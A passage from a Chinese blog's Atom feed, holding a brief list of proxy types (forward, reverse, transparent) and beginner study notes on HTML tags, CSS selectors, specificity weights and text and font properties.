&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>代理</title>
		<published>2020-07-23T00:00:00+00:00</published>
		<updated>2020-07-23T00:00:00+00:00</updated>
		<link href="https://baz.ee/dai-li/" type="text/html"/>
		<id>https://baz.ee/dai-li/</id>
		<content type="html">&lt;h1 id=&quot;dai-li&quot;&gt;代理&lt;&#x2F;h1&gt;
&lt;ol&gt;
&lt;li&gt;正向代理&lt;&#x2F;li&gt;
&lt;li&gt;反向代理&lt;&#x2F;li&gt;
&lt;li&gt;透明代理&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>HTML与CSS</title>
		<published>2020-07-01T00:00:00+00:00</published>
		<updated>2020-07-01T00:00:00+00:00</updated>
		<link href="https://baz.ee/htmlyu-css/" type="text/html"/>
		<id>https://baz.ee/htmlyu-css/</id>
		<content type="html">&lt;p&gt;HTML介绍&lt;&#x2F;p&gt;
&lt;p&gt;超文本标记语言，用来描述网页。用HTML写的文档称为HTML文档，也叫做web页面，包括了HTML标签、图片、视频等内容。&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;HTML、CSS、JavaScript之间的关系&lt;&#x2F;p&gt;
&lt;p&gt;HTML主要用于承载网页的内容（文本，图片，语音，视频等）&lt;&#x2F;p&gt;
&lt;p&gt;CSS用于实现网页内容的装饰（字体，颜色，布局等）&lt;&#x2F;p&gt;
&lt;p&gt;JavaScript用于实现网页内容的特效（交换、弹出、滑动等）&lt;&#x2F;p&gt;
&lt;p&gt;HTML版本&lt;&#x2F;p&gt;
&lt;p&gt;HTML标准化是由W3C来推动的，当前常见版本为HTML 4.01和HTML 5&lt;&#x2F;p&gt;
&lt;p&gt;HTML网页结构&lt;&#x2F;p&gt;
&lt;p&gt;先由一个声明开始，然后是html标签。在HTML标签里面有两个子标签head和body。&lt;&#x2F;p&gt;
&lt;p&gt;Head里面涉及网页标题，字符集，样式，链接等&lt;&#x2F;p&gt;
&lt;p&gt;Body是浏览器呈现给用户的内容，包括标题、文本、段落、链接、图片、媒体等。&lt;&#x2F;p&gt;
&lt;p&gt;所有内容都由html标签来实现&lt;&#x2F;p&gt;
&lt;p&gt;标签&#x2F;元素&#x2F;属性&lt;&#x2F;p&gt;
&lt;p&gt;HTML页面由标签和内容组成。标签一般情况下都是成对出现的，由开始标签和结束标签组成。&lt;&#x2F;p&gt;
&lt;p&gt;元素&lt;&#x2F;p&gt;
&lt;p&gt;指的就是开始标签和结束标签直接的所有代码，元素内容就是开始和结束标签之间的内容&lt;&#x2F;p&gt;
&lt;p&gt;元素的语法：&lt;&#x2F;p&gt;
&lt;p&gt;\1.   元素以开始标签开始&lt;&#x2F;p&gt;
&lt;p&gt;\2.   元素以结束标签终止&lt;&#x2F;p&gt;
&lt;p&gt;\3.   元素内容就是开始和结束标签之间的内容&lt;&#x2F;p&gt;
&lt;p&gt;\4.   某些元素具有空内容&lt;&#x2F;p&gt;
&lt;p&gt;\5.   大多数元素都可以拥有属性&lt;&#x2F;p&gt;
&lt;p&gt;属性&lt;&#x2F;p&gt;
&lt;p&gt;属性是为元素提供的附件信息，属性一般描述于开始标签，属性总是以（名称-值）对的方式出现&lt;&#x2F;p&gt;
&lt;p&gt;属性名称和值对大小写不敏感&lt;&#x2F;p&gt;
&lt;p&gt;属性的值要放在引号内，单引号和双引号都可以&lt;&#x2F;p&gt;
&lt;p&gt;HTML头部&lt;&#x2F;p&gt;
&lt;p&gt;可以添加在头部中的标签有：&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;title&amp;gt; &amp;lt;style&amp;gt; &amp;lt;script&amp;gt; &amp;lt;meta&amp;gt; &amp;lt;base&amp;gt; &amp;lt;link&amp;gt; &amp;lt;lang&amp;gt;&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;定义字符集&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;meta name=”keywords”content=”html”&amp;gt;为搜索引擎定义关键词&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;meta name=”description”content=”biao ji yu yan”&amp;gt;为网页定义描述内容&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;meta name=”pinginglab”content=”zuozhe”&amp;gt;为网页定义坐着&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;style&amp;gt;标签，主要用来修改元素的样式&lt;&#x2F;p&gt;
&lt;p&gt;Style属性，放在元素标签里面的，也可以修改元素的样式&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;link&amp;gt;标签，用来链接一个外部样式表（CSS）&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;base&amp;gt;用来修改网页链接的默认地址&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;script&amp;gt;用来添加JavaScript代码&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;lang&amp;gt;定义元素内容的语言，一般情况下直接可以在html标签里面添加lang属性来定义&lt;&#x2F;p&gt;
&lt;p&gt;Lang属性在&amp;lt;base&amp;gt;&amp;lt;script&amp;gt;&amp;lt;iframe&amp;gt;等标签中没有效果&lt;&#x2F;p&gt;
&lt;p&gt;HTML标题&lt;&#x2F;p&gt;
&lt;p&gt;标题通过&amp;lt;h1&amp;gt;-&amp;lt;h6&amp;gt;来实现&lt;&#x2F;p&gt;
&lt;p&gt;水平线&amp;lt;hr&amp;gt;&lt;&#x2F;p&gt;
&lt;p&gt;实现内容上下文的分割&lt;&#x2F;p&gt;
&lt;p&gt;HTML段落&lt;&#x2F;p&gt;
&lt;p&gt;通过&amp;lt;p&amp;gt;标签来定义&lt;&#x2F;p&gt;
&lt;p&gt;折行&amp;lt;br&amp;gt;&lt;&#x2F;p&gt;
&lt;p&gt;在不产生一个新段落的情况下进行换行&lt;&#x2F;p&gt;
&lt;p&gt;HTML文本&lt;&#x2F;p&gt;
&lt;p&gt;文本具有多种格式化标签，可以实现文本的加粗、斜体、上下标、计算机输出等处理。&lt;&#x2F;p&gt;
&lt;p&gt;常用的文本标签有文本格式化标签、计算机输出标签、引用标签。&lt;&#x2F;p&gt;
&lt;p&gt;文本格式化标签&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;b&amp;gt; 定义加粗文本&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;big&amp;gt; 定义大号字&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;em&amp;gt; 定义着重文字&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;i&amp;gt; 定义斜体字&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;small&amp;gt; 定义小号字&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;strong&amp;gt; 定义加重语气&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;sub&amp;gt; 定义下标字&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;sup&amp;gt; 定义上标字&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;ins&amp;gt; 定义插入字&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;del&amp;gt; 定义删除字&lt;&#x2F;p&gt;
&lt;p&gt;计算机输出标签&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;code&amp;gt; 定义计算机代码 不会保留多余的空格或折行&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;kbd&amp;gt; 定义键盘码&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;samp&amp;gt; 定义计算机代码样本&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;tt&amp;gt; 定义打字机码&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;var&amp;gt; 定义变量&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;pre&amp;gt; 定义预格式文本&lt;&#x2F;p&gt;
&lt;p&gt;引用标签&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;abbr&amp;gt; 定义缩写&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;address&amp;gt; 定义地址&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;bdo&amp;gt; 定义文字方向&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;blockquote&amp;gt; 定义长的引用 浏览器会对元素进行缩进处理
&amp;lt;q&amp;gt; 定义的短的引用&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;cite&amp;gt; 定义引用、引证&lt;&#x2F;p&gt;
&lt;p&gt;注释标签&lt;&#x2F;p&gt;
&lt;p&gt;&amp;lt;!--要注释的内容--&amp;gt;&lt;&#x2F;p&gt;
&lt;p&gt;超链接&lt;&#x2F;p&gt;
&lt;p&gt;使用&amp;lt;a&amp;gt;标签来设置超文本链接&lt;&#x2F;p&gt;
&lt;p&gt;超链接可以是一个字，一个词，也可以是一张图片。&lt;&#x2F;p&gt;
&lt;p&gt;HTML列表&lt;&#x2F;p&gt;
&lt;p&gt;无序列表，使用粗体圆点进行表决&lt;&#x2F;p&gt;
&lt;p&gt;HTML表格&lt;&#x2F;p&gt;
&lt;p&gt;HTML图片&lt;&#x2F;p&gt;
&lt;p&gt;通过&amp;lt;img&amp;gt;标签向网页添加图片。&amp;lt;img&amp;gt;是空标签，只包含属性，并且没有闭合标签&lt;&#x2F;p&gt;
&lt;p&gt;要在页面显示图片，要使用src属性添加图片的url，使用width和height修改图片的宽度和高度，通过alt属性设置图片加载失败的提示信息。&lt;&#x2F;p&gt;
&lt;p&gt;HTML布局&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91&#x2F;clip_image002.jpg&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;第一种布局就是使用&amp;lt;div&amp;gt;标签来实现&lt;&#x2F;p&gt;
&lt;p&gt;第二种布局采用的是HTML5提供的新语义元素&lt;&#x2F;p&gt;
&lt;p&gt;Header 定义文档或者页眉&lt;&#x2F;p&gt;
&lt;p&gt;Nav 定义导航栏&lt;&#x2F;p&gt;
&lt;p&gt;Section 定义文档中的节&lt;&#x2F;p&gt;
&lt;p&gt;Article定义独立的自包含文章&lt;&#x2F;p&gt;
&lt;p&gt;Aside 定义侧边栏&lt;&#x2F;p&gt;
&lt;p&gt;Footer 定义页脚&lt;&#x2F;p&gt;
&lt;p&gt;Details 定义额外细节&lt;&#x2F;p&gt;
&lt;p&gt;Summary 定义details的标题&lt;&#x2F;p&gt;
&lt;p&gt;HTML块元素和内联元素&lt;&#x2F;p&gt;
&lt;p&gt;块元素特点：&lt;&#x2F;p&gt;
&lt;p&gt;\1.   总是在新行上开始，占据一整行&lt;&#x2F;p&gt;
&lt;p&gt;\2.   高度、行高以及内外边距都可以控制&lt;&#x2F;p&gt;
&lt;p&gt;\3.   宽度始终与浏览器的宽度一样，与内容无关&lt;&#x2F;p&gt;
&lt;p&gt;\4.   可以容纳内联元素和其他块元素&lt;&#x2F;p&gt;
&lt;p&gt;常见的块元素： address div dl form h1-h6 ol p table ul li&lt;&#x2F;p&gt;
&lt;p&gt;内联元素特点：&lt;&#x2F;p&gt;
&lt;p&gt;\1.   和其他元素都在一行上&lt;&#x2F;p&gt;
&lt;p&gt;\2.   高度、行高以及内外边距部分可改变&lt;&#x2F;p&gt;
&lt;p&gt;\3.   宽度只和元素内容有关&lt;&#x2F;p&gt;
&lt;p&gt;\4.   内联元素只能容纳文本和其他的内联元素&lt;&#x2F;p&gt;
&lt;p&gt;常见的内联元素：a b em img input select small textarea&lt;&#x2F;p&gt;
&lt;p&gt;可变元素&lt;&#x2F;p&gt;
&lt;p&gt;Button&lt;&#x2F;p&gt;
&lt;p&gt;我们可以通过CSS来修改元素的类型&lt;&#x2F;p&gt;
&lt;p&gt;Display：block&lt;&#x2F;p&gt;
&lt;p&gt;Display：inline&lt;&#x2F;p&gt;
&lt;p&gt;Display：inline-block&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91&#x2F;clip_image004.jpg&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91&#x2F;clip_image006.jpg&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;CSS基础&lt;&#x2F;p&gt;
&lt;p&gt;层叠样式表，用于定义HTML内容在浏览器内的显示样式，比如文字大小，颜色布局等&lt;&#x2F;p&gt;
&lt;p&gt;CSS语法&lt;&#x2F;p&gt;
&lt;p&gt;由选择器和声明两部分组成&lt;&#x2F;p&gt;
&lt;p&gt;选择器指的是需要改变样式的HTML元素&lt;&#x2F;p&gt;
&lt;p&gt;而声明是由一个属性和一个值组成&lt;&#x2F;p&gt;
&lt;p&gt;body{&lt;&#x2F;p&gt;
&lt;p&gt;background:red；&lt;&#x2F;p&gt;
&lt;p&gt;border:1px solid blue;&lt;&#x2F;p&gt;
&lt;p&gt;}&lt;&#x2F;p&gt;
&lt;p&gt;声明需要用花括号包裹起来&lt;&#x2F;p&gt;
&lt;p&gt;如果不止一个声明，声明之间需要通过分号来隔开&lt;&#x2F;p&gt;
&lt;p&gt;属性和值之间用冒号，如果值有多个单词，则要加引号&lt;&#x2F;p&gt;
&lt;p&gt;CSS注释&lt;&#x2F;p&gt;
&lt;p&gt;HTML&amp;lt;!--需要注释的内容--&amp;gt;&lt;&#x2F;p&gt;
&lt;p&gt;CSS &#x2F;*   *&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;CSS分类&lt;&#x2F;p&gt;
&lt;p&gt;内联式：写在HTML元素内部，通过style属性引入&lt;&#x2F;p&gt;
&lt;p&gt;嵌入式：位于&amp;lt;head&amp;gt;标签里，通过&amp;lt;style&amp;gt;标签来实现&lt;&#x2F;p&gt;
&lt;p&gt;外联式：需要从外部导入，在head中通过使用&amp;lt;link&amp;gt;来引用&lt;&#x2F;p&gt;
&lt;p&gt;三种样式中，内联式的权重是最高的，嵌入式和外联式的权重和书写顺序有关，当对同一个元素设置同一个样式的时候，后面的会覆盖掉前面的样式。不同的属性是不会覆盖的&lt;&#x2F;p&gt;
&lt;p&gt;CSS特点&lt;&#x2F;p&gt;
&lt;p&gt;继承&lt;&#x2F;p&gt;
&lt;p&gt;可以继承的属性：概括为所有关于文字图片大小样式的属性&lt;&#x2F;p&gt;
&lt;p&gt;line-height    color	font&lt;&#x2F;p&gt;
&lt;p&gt;所有关于盒子的，定位的，布局的属性是不能继承的&lt;&#x2F;p&gt;
&lt;p&gt;层叠&lt;&#x2F;p&gt;
&lt;p&gt;如果两个相同的属性作用于同一个标签，它们会发生层叠&lt;&#x2F;p&gt;
&lt;p&gt;后面会覆盖前面的内容&lt;&#x2F;p&gt;
&lt;p&gt;CSS选择器&lt;&#x2F;p&gt;
&lt;p&gt;选择特定的网页元素，再根据选择器选择的网页元素做设置&lt;&#x2F;p&gt;
&lt;p&gt;基本选择器&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;通配符选择器（*）：可以和所有元素匹配&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;元素选择器：最常见的CSS选择器。比如p h1 a body 甚至html本身&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;类选择器：类选择器容许以一种独立于文档元素的方式来指定样式，该选择器可以独立使用，也可以和其他元素结合使用，要使用类选择器，必须得先对文档进行标记才能使用，标签里面设置class属性。然后在头部里面通过“.”来调用。在同一个html文档中，可以同时设置多个类名相同的类选择器&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;ID选择器：类似于类选择器，用#来调用，同一个HTML文档中相同名称的ID只能设置一个&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;类选择器还是ID选择器？
&lt;ul&gt;
&lt;li&gt;同一个文档中，ID选择器能使用仅且一次&lt;&#x2F;li&gt;
&lt;li&gt;ID选择器设置的时候不能使用词组&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;后代选择器：包含选择器，可以选择作为某元素后代的所有元素。匹配符是空格。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;子元素选择器：与后代选择器相比，子元素选择器只能选择作为某元素子元素的元素，匹配符是&amp;gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;相邻兄弟选择器：两者有相同的父元素，且相邻，可以使用相邻兄弟选择器，匹配符是+&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;通用兄弟选择器：用来选择位于同一个父元素之中的某个元素的所有其他种类的兄弟元素，匹配符是“~”&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;群组选择器：同时对&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;伪类选择器：用于向某些选择器添加特殊的效果。语法：选择器：伪类{}&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;锚伪类：在浏览器中，链接的不同状态都可以有不同的显示方式，活动状态，已被访问状态，未被访问状态，鼠标悬停状态：link,visited,hover,active。&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;hover必须位于link 和visited之后，才是有效的&lt;&#x2F;li&gt;
&lt;li&gt;active必须位于hover之后才是有效的&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;UI元素状态伪类：指定的样式只用于当元素处于某种状态下才起作用，在默认的状态下不起作用&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;hover 当鼠标指针移动到元素上时&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;active 元素被激活（鼠标在元素上按下去没有松开）&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;focus 当元素获得焦点的时候，主要是文本框获得光标聚焦点&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;enable 当元素处于可用状态时的样式&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;disable 当元素处于不可用状态时的样式&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;read-only 当元素处于只读状态时的样式&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;read-write 当元素处于读写状态时的样式&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;checked 当表单中的单选框或者复选框处于选取状态&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;default 当页面打开时默认处于选取状态的单选框或者复选框的样式&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;indeterminate 当页面打开，一组单选框中没有任何一个单选框被设定为选中状态时，整个单选框的样式&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;selection 当元素处于选中状态时的样式&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;invalid&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;valid&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;required&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;optional&lt;&#x2F;p&gt;
&lt;p&gt;一般用于input select textarea这些元素&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;in-range&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;out-of-range&lt;&#x2F;p&gt;
&lt;p&gt;结构类&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;first-child 匹配属于其父元素的首个子元素的每个元素&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;last-child&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;first-of-type 匹配属于其父元素的特定类型的首个子元素的每个元素&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;last-of-type &lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;empty 匹配没有子元素(包括文本节点)的每个元素&lt;&#x2F;p&gt;
&lt;p&gt;empty代表没有文本内容的元素，所以如果是块元素，那么在浏览器中不占空间，所以要看现象就需要设置高度和宽度。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;not 否定选择器：匹配非指定元素的每个元素&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;伪元素&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;first-line&lt;&#x2F;li&gt;
&lt;li&gt;first-letter&lt;&#x2F;li&gt;
&lt;li&gt;before&lt;&#x2F;li&gt;
&lt;li&gt;after&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;属性选择器：根据元素的属性及属性值选择元素。在属性选择器选择属性设置值的时候，只能完全匹配，不能只设置匹配值的部分字段&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;[attribute] [target] 选择带有target属性的所有元素&lt;&#x2F;li&gt;
&lt;li&gt;[attribute=value] [target_blank]选择target=&amp;quot;_blank&amp;quot; 的所有元素&lt;&#x2F;li&gt;
&lt;li&gt;[attribute~=value] [title~=flower]选择title属性包含单词 &amp;quot;flower&amp;quot; 的所有元素&lt;&#x2F;li&gt;
&lt;li&gt;[attribute|=value] [lang|=en] 选择lang属性值以&amp;quot;en&amp;quot;开头的所有元素&lt;&#x2F;li&gt;
&lt;li&gt;[attribute^=value] 匹配属性值以指定值开头的每个元素&lt;&#x2F;li&gt;
&lt;li&gt;[attribute$=value] 匹配属性值以指定值结尾的每个元素&lt;&#x2F;li&gt;
&lt;li&gt;[attribute*=value] 匹配属性值中包含指定值的每个元素&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;选择器权重：选择器是有优先级的，如果优先级一样，后面的会覆盖前面的样式&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91&#x2F;image-20200808142240352.png&quot; alt=&quot;image-20200808142240352&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;​			选择器的级别分为四个等级。每个等级代表一类选择器&lt;&#x2F;p&gt;
&lt;p&gt;​			第一等：内联式 style=””，权重为1000&lt;&#x2F;p&gt;
&lt;p&gt;​			第二等：ID选择器 #nav，权重为100&lt;&#x2F;p&gt;
&lt;p&gt;​			第三等：类、伪类、属性选择器 .active，权重为10&lt;&#x2F;p&gt;
&lt;p&gt;​			第四等：元素选择器 a ，权重为1&lt;&#x2F;p&gt;
&lt;p&gt;​			通配符选择器，子选择器（&amp;gt;）、兄弟选择器&amp;lt;+ ~&amp;gt;不在这四个等级中，所以优先级为0&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91&#x2F;image-20200808142336474.png&quot; alt=&quot;image-20200808142336474&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;总结：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;包含更高权重选择器的一条规则拥有更高权重&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;ID选择器权重高于属性选择器&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;与元素“挨得近”的规则生效（比如说内联式，是直接写在元素标签的）&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;最后的定义的规则会覆盖掉前面与之冲突的规则&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;无论有多少个元素选择器，都没有一个类选择器的权重高&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;CSS背景：用于定义HTML元素的背景，可以通过设置背景颜色或者图片等方式来实现&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;background： 把所有关于背景的属性设置在一个声明中&lt;&#x2F;li&gt;
&lt;li&gt;background-color：设置背景颜色 不能继承，默认值为透明（transparent）&lt;&#x2F;li&gt;
&lt;li&gt;background-image：设置背景图片&lt;&#x2F;li&gt;
&lt;li&gt;background-repeat：设置背景图示是否重复以及如何重复&lt;&#x2F;li&gt;
&lt;li&gt;background-attachment：设置背景图片是固定还是滚动&lt;&#x2F;li&gt;
&lt;li&gt;background-position：设置背景图片位置&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;CSS文本&lt;&#x2F;p&gt;
&lt;p&gt;文本属性可以定义文本的外观，包括文本颜色、字符间距、对齐方式、装饰文本以及文本缩进&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;color&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;direction 设置文本方向，正常的字符排列不会颠倒&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;line-height&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;letter-spacing&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;word-spacing&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;text-align&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;text-decoration&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;text-indent&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;text-transform&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;uppercase &lt;&#x2F;li&gt;
&lt;li&gt;lowercase &lt;&#x2F;li&gt;
&lt;li&gt;capitalize&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;white-space   不能对手工换行生效&amp;lt;br&amp;gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;如果要字符反转：&amp;lt;p&amp;gt;&amp;lt;bdo dir=&amp;quot;rtl&amp;quot;&amp;gt;this is a test&amp;lt;&#x2F;bdo&amp;gt;&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;p&gt;
&lt;p&gt;CSS字体：定义文本的字体系统、大小、加粗、风格和变形&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;font:把多个设置放在一个声明中&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;font-family：设置字体族（字体系列）&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;font-size：设置字体大小&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;font-style：设置字体风格&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;font-weight：设置字体粗细&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;normal 默认值&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;bold&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;bolder&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;lighter&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;100-900&lt;&#x2F;p&gt;
&lt;p&gt;400=normal 700=bold&lt;&#x2F;p&gt;
&lt;p&gt;CSS链接：对链接设置各种属性，包括color background font-family&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;text-decoration:none：去除链接的下划线&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;background-color: 设置链接的背景颜色&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
